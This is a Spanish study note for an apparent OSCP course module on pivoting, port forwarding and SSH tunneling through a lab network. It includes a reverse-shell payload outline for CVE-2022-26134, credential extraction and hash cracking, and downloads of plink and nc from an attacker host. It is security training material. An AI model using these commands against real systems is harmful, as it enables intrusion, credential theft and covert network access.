---
tipo: modulo
modulo: 19
estado: repasado
tags:
  - oscp
  - pivoting
  - linux
  - windows
fecha: 2026-10-06
---

# 19 - Port Redirection and SSH Tunneling

> [!abstract] Resumen
> Técnicas para **atravesar límites de red** (segmentación, firewalls) desde un host comprometido y alcanzar servicios internos no rutables desde Kali. Escenario base: comprometemos **CONFLUENCE01** (CVE-2022-26134, RCE) que hace de pivote hacia PGDATABASE01 / HRSHARES / MULTISERVER03.
> - **19.2 Port forwarding Linux (Socat)**: escuchar en un puerto del pivote y reenviar a un socket interno. Mismo host escucha **y** reenvía.
> - **19.3 SSH tunneling**: encapsular tráfico en SSH. Cuatro variantes según **dónde se bindea el puerto** y **quién reenvía**: **local** (`-L`), **dynamic** (`-D`, SOCKS), **remote** (`-R`), **remote dynamic** (`-R <port>`, SOCKS). Más **Proxychains** (forzar herramientas no-SOCKS por el proxy) y **sshuttle** (VPN-like).
> - **19.4 Port forwarding Windows**: **ssh.exe** (OpenSSH nativo ≥1803), **Plink** (PuTTY CLI, sin remote dynamic) y **Netsh portproxy** (nativo, requiere admin + abrir regla en el firewall).
> Idea clave del examen: **local/dynamic** → el puerto escucha en el **cliente SSH** (sirve si *entras* al pivote). **remote/remote-dynamic** → el puerto escucha en el **servidor SSH = tu Kali** (sirve si solo puedes *salir* del pivote, p.ej. firewall inbound). **dynamic** = un solo puerto SOCKS para **cualquier** host/puerto.

## Conceptos clave
- **Red plana vs segmentada**: plana = todos hablan con todos (mala práctica; un host comprometido → acceso libre). Segmentada = subredes con acceso mínimo necesario → limita el movimiento lateral. **DMZ** = subred buffer entre la red no confiable y la interna.
- **Firewall vs DPI**: firewall filtra por **IP/puerto**; **Deep Packet Inspection** inspecciona el **contenido** y corta según reglas (se ve en el módulo 20).
- **Port redirection (port forwarding)**: redirige paquetes de un socket a otro. **Tunneling**: encapsula un stream dentro de otro (p.ej. tráfico dentro de SSH → desde fuera solo se ve SSH).
- **Socat**: redirector genérico, un solo comando. El **mismo host** escucha y reenvía.
- **SSH local (-L)**: el puerto escucha en el **cliente**; el **servidor** reenvía. Un socket por conexión.
- **SSH dynamic (-D)**: el puerto es un **SOCKS proxy** en el **cliente**; el servidor reenvía a donde diga el header SOCKS. Muchos destinos por una conexión.
- **SSH remote (-R)**: el puerto escucha en el **servidor** (tu Kali); el **cliente** reenvía. "Como un reverse shell, pero para port forwarding" → ideal si el firewall bloquea inbound al pivote pero permite outbound.
- **SSH remote dynamic** (`-R <port>`): SOCKS proxy bindeado en el **servidor** (Kali). Requiere **OpenSSH cliente ≥7.6** (el server da igual).
- **SOCKS / Proxychains**: SOCKS es un protocolo de proxy; las herramientas no-SOCKS no saben usarlo → **Proxychains** las "engancha" (LD_PRELOAD) y mete su tráfico por el proxy. No funciona en binarios estáticos.
- **sshuttle**: convierte SSH en una especie de **VPN** (añade rutas). Requiere **root en el cliente** y **Python3 en el server**.

> [!tip] Idea para el examen
> Regla mnemotécnica: **local/dynamic → escucha en el CLIENTE** (tú estás dentro y abres un puerto en el pivote). **remote/remote-dynamic → escucha en el SERVIDOR = tu Kali** (el pivote solo puede salir). Las **dynamic** (`-D` y `-R <port>`) crean un **SOCKS** → un puerto para todo; úsalas con **proxychains**. Para no abrir shell en el forward usa **`-N`**. Como `confluence` (no root) no puedes escuchar en puertos <1024 → usa 4455/2345/9999. Baja `tcp_read_time_out`/`tcp_connect_time_out` en `proxychains4.conf` para acelerar escaneos.

---

## 19.1 Acceso inicial (base del escenario)

CONFLUENCE01 vulnerable a **CVE-2022-26134** (OGNL injection → RCE). Payload (del blog de Rapid7) **parcialmente** URL-encoded: `.`, `-` y `/` **no** se codifican o el server parsea mal la URL. Modificar solo IP del Confluence y la IP/puerto de la revshell.
```bash
nc -nvlp 4444    # listener
# curl a la URL con el payload OGNL (ProcessBuilder -> bash -i >& /dev/tcp/<KALI>/4444 0>&1)
```
Enumeración en el pivote y botín:
```bash
ip addr ; ip route     # CONFLUENCE01 tiene 2 NICs: 192.168.50.63 (WAN) y 10.4.50.63 (interna)
cat /var/atlassian/application-data/confluence/confluence.cfg.xml   # creds PostgreSQL en claro
# hashes de usuarios -> hashcat -m 12001 (Atlassian PBKDF2-HMAC-SHA1) -> database_admin, hr_admin, rdp_admin
```

> [!warning] No ejecutes payloads sin entenderlos. URL-decodifica con Burp (Decode as → URL) o CyberChef (ojo con datos sensibles en herramientas online).

---

## 19.2 Port forwarding con Socat (Linux)

Objetivo: desde Kali llegar a PostgreSQL (5432) en PGDATABASE01, no rutable. CONFLUENCE01 escucha en su WAN y reenvía. **No hay firewall** entre Kali y el pivote en este escenario.
```bash
# en CONFLUENCE01: escucha 2345, reenvía a 5432 de PGDATABASE01
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
#   -ddd = verbose ; fork = atiende varias conexiones (no muere tras la 1ª)
```
```bash
# desde Kali, como si fuera directo a PGDATABASE01
psql -h 192.168.50.63 -p 2345 -U postgres     # \l lista DBs ; \c confluence ; select * from cwd_user;
# reutilizar creds crackeadas via otro forward a SSH:
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
ssh database_admin@192.168.50.63 -p2222
```
> [!warning] Puertos de escucha raros (2345) o conexiones salientes de un service user no privilegiado son **fáciles de detectar**. Alternativas a Socat: `rinetd` (daemon, persistente), Netcat + FIFO, o `iptables` (si root, requiere habilitar forwarding en `/proc/sys/net/ipv4/conf/<if>/forwarding`).

---

## 19.3 SSH tunneling

Ventaja: el tráfico va **cifrado** y SSH **se camufla** como administración legítima. `-N` evita abrir shell. Las 4 variantes:

### 19.3.1 Local port forward (`-L`) — escucha en el CLIENTE

El cliente SSH (CONFLUENCE01) abre el puerto; el server (PGDATABASE01) reenvía. Un socket por túnel.

![[mod19-ssh-local-forward.png]]
```bash
# formato: -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
# en CONFLUENCE01: escucha 4455, el server reenvía a 445 de HRSHARES
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
# descubrir HRSHARES antes, sin port scanner, con un sweep:
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```
```bash
# desde Kali, conectar a 4455 en CONFLUENCE01 = 445 en HRSHARES
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234   # ls / get
```

### 19.3.2 Dynamic port forward (`-D`) — SOCKS en el CLIENTE

Un **único puerto SOCKS**; alcanza cualquier host/puerto que vea el server. Limitación: la herramienta debe hablar SOCKS → usar **Proxychains**.

![[mod19-ssh-dynamic-forward.png]]
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215    # SOCKS en 9999 de CONFLUENCE01
# /etc/proxychains4.conf -> última línea:  socks5 192.168.50.63 9999
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217   # nmap SIEMPRE -sT por SOCKS
```

### 19.3.3 Remote port forward (`-R`) — escucha en el SERVIDOR (Kali)

Para cuando el **firewall bloquea inbound** al pivote (solo TCP/8090) pero permite **outbound**. El pivote hace SSH **saliente** a tu Kali y el puerto se bindea en **Kali**.

![[mod19-ssh-remote-forward.png]]
```bash
# en Kali: habilitar el server SSH (y password auth en sshd_config si hace falta)
sudo systemctl start ssh
# en CONFLUENCE01: escucha 2345 en LOOPBACK de Kali, el cliente reenvía a 5432 de PGDATABASE01
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
```bash
psql -h 127.0.0.1 -p 2345 -U postgres     # desde Kali, contra su propio loopback
```

### 19.3.4 Remote dynamic port forward (`-R <port>`) — SOCKS en el SERVIDOR (Kali)

Igual que remote pero **SOCKS** (flexible). Mismo flag `-R` pero **un solo socket** (el puerto). Requiere **OpenSSH cliente ≥7.6**.

![[mod19-ssh-remote-dynamic-forward.png]]
```bash
ssh -N -R 9998 kali@192.168.118.4           # SOCKS en 127.0.0.1:9998 de Kali
# /etc/proxychains4.conf -> socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64    # escanear MULTISERVER03
```

### 19.3.5 sshuttle (VPN-like)
```bash
# tras un forward a SSH (socat 2222 -> 22), rutar subredes transparentemente
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234    # sin proxychains, directo
```
> [!important] Requiere **root en el cliente** (Kali) y **Python3 en el server**. Cómodo cuando hay muchas subredes: no tocas proxychains ni abres puertos manualmente.

---

## 19.4 Port forwarding con herramientas Windows

### 19.4.1 ssh.exe (OpenSSH nativo)
Incluido por defecto desde Windows **1803** (`%SystemRoot%\System32\OpenSSH`). Versión >7.6 → soporta remote dynamic.
```powershell
where ssh ; ssh.exe -V        # comprobar presencia y versión
ssh -N -R 9998 kali@192.168.118.4    # remote dynamic desde MULTISERVER03 (Windows) a Kali
```
```bash
xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:192.168.50.64    # (RDP para entrar antes)
proxychains psql -h 10.4.50.215 -U postgres              # usar el SOCKS 9998
```

### 19.4.2 Plink (PuTTY CLI)
Cuando han quitado OpenSSH. Poco sospechoso (herramienta de admins). **No** soporta remote dynamic. Descargar `plink.exe` (y `nc.exe` para la revshell) vía `powershell wget`.
```powershell
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
# remote port forward: 9833 en Kali -> 3389 (RDP) en loopback de MULTISERVER03
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
# shell limitada que no deja aceptar la host key:
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 <KALI>
```
```bash
xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833   # RDP por el forward
```
> [!warning] `-pw` en línea de comandos puede **loguear tu password de Kali**. En redes hostiles crea un usuario solo-forwarding en Kali.

### 19.4.3 Netsh portproxy (nativo Windows)
Requiere **admin** (ojo UAC). Deja artefactos → **limpiar al terminar**.
```powershell
# escucha 2222 en la WAN de MULTISERVER03 -> 22 de PGDATABASE01
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
netsh interface portproxy show all
netstat -anp TCP | find "2222"
# el Windows Firewall bloquea inbound (nmap lo ve 'filtered') -> abrir regla:
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```
```bash
ssh database_admin@192.168.50.64 -p2222    # desde Kali -> SSH a PGDATABASE01
```
```powershell
# LIMPIEZA (imprescindible)
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

---

## Comandos
```bash
# Socat
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# SSH port forwarding (lanzar DESDE el pivote salvo remote*, que salen hacia Kali)
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@PIVOT2   # local    (escucha en cliente)
ssh -N -D 0.0.0.0:9999 user@PIVOT2                      # dynamic  (SOCKS en cliente)
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@KALI     # remote   (escucha en Kali)
ssh -N -R 9998 kali@KALI                                # remote dynamic (SOCKS en Kali)

# Proxychains + sshuttle
proxychains <tool> ...            # /etc/proxychains4.conf -> socks5 <ip> <port>
sshuttle -r user@PIVOT:2222 10.4.50.0/24 172.16.50.0/24

# Windows
ssh -N -R 9998 kali@KALI                                            # ssh.exe (remote dynamic)
plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 KALI   # Plink (remote)
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<WAN> connectport=22 connectaddress=<DEST>
```
| Flag / parte | Qué hace |
|---|---|
| `-L [lip:]lport:dip:dport` | Local forward: escucha en el **cliente**, reenvía el **server** |
| `-D [lip:]lport` | Dynamic: **SOCKS** en el cliente |
| `-R lip:lport:dip:dport` | Remote: escucha en el **server (Kali)**, reenvía el cliente |
| `-R lport` | Remote **dynamic**: SOCKS en el server (Kali) |
| `-N` | No ejecutar comando remoto (solo el forward) |
| `fork` (socat) | Atiende múltiples conexiones |
| `netsh ... portproxy add v4tov4` | Port forward nativo Windows (requiere admin) |

> [!warning] Errores comunes / cosas que fallan
> - Como usuario no privilegiado no puedes escuchar en puertos **<1024**.
> - El forward "ocupa" la reverse shell → saca **otra** revshell para enumerar/ver `ss -ntplu`.
> - `smbclient`/`nmap` **no hablan SOCKS** → anteponer `proxychains`; con nmap usar **`-sT -Pn`**.
> - Shells sin TTY no aceptan el prompt de host key → `python3 -c 'import pty; pty.spawn("/bin/bash")'` o `echo y | plink...`.
> - **Netsh**: el puerto sale `filtered` hasta abrir regla en el **Windows Firewall**; recuerda **borrar** regla y portproxy.
> - Proxychains con timeouts altos = escaneo lentísimo → bajar `tcp_read_time_out`/`tcp_connect_time_out`.

## Ejemplo práctico
> [!example] Elegir la variante correcta
> - **Puedo conectar a puertos que abro en el pivote** (sin firewall inbound) → `-L` (un servicio) o `-D` + proxychains (varios). El puerto vive en el pivote.
> - **El firewall bloquea inbound al pivote pero deja salir** → `-R` (un servicio) o `-R <port>` + proxychains (varios). Monta `sshd` en Kali; el puerto vive en tu loopback.
> - **Pivote Windows** → `ssh.exe` si está (≥7.6 permite `-R <port>`), si no **Plink** (`-R` simple), o **Netsh portproxy** con admin (+ abrir/limpiar regla de firewall).
> - **Muchas subredes y tengo root** → `sshuttle` y trabaja como si estuvieras dentro.

## Relacionado
- Técnicas: [[SSH Port Forwarding]] · [[Proxychains]]
- Cheatsheet: [[Pivoting y Tunneling]]
- Módulo siguiente: [[20 - Tunneling Through Deep Packet Inspection]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - ¿Cómo decido rápido en el examen entre `-L`/`-D`/`-R` según lo que bloquea el firewall? (ver ejemplo práctico)
> - Repasar sintaxis exacta `-R` **remote** (dos sockets) vs **remote dynamic** (un puerto) para no confundirlas.
> - `sshuttle` con un pivote intermedio (doble salto): ¿cómo encadenar?
